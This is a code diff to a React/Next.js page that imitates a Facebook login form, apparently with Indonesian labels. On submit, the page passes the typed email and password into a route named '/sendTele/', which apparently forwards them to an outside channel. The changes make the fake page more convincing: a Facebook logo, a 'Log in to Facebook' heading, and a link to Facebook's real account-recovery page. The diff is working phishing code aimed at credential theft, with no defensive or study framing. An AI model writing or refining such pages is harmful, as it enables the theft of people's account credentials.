@@ -26,19 +26,21 @@ function page() {
     router.push(`/sendTele/${email}/${password}`);
   };
   return (
-    <div className=" lg:flex justify-center  p-10">
-      <div className="grid grid-cols-1 px-3 text-center py-3 rounded-md border">
-        <Image
+    <div className=" lg:px-96 justify-center  px-10 py-20">
+       <Image
           className="mx-auto my-5"
           src="/images/facebook.png"
           alt={"facebook"}
           width={200}
           height={100}
         />
+      <div className="grid grid-cols-1 mx-auto px-3 lg:w-96 w-72 text-center py-3 rounded-md border drop-shadow-md bg-white">
+       
+        <h1>Log in to Facebook</h1>
         <form onSubmit={handleSubmit} className="grid">
           <input
             type="email"
-            placeholder="Email"
+            placeholder="Email Address"
             name="email"
             value={email}
             onChange={handleInputChange}
@@ -55,7 +57,7 @@ function page() {
             required
           />
           <Link
-            href={"/"}
+            href={"https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"}
             className="flex justify-end text-sm text-gray-400 mb-4"
           >
             Lupa Password?
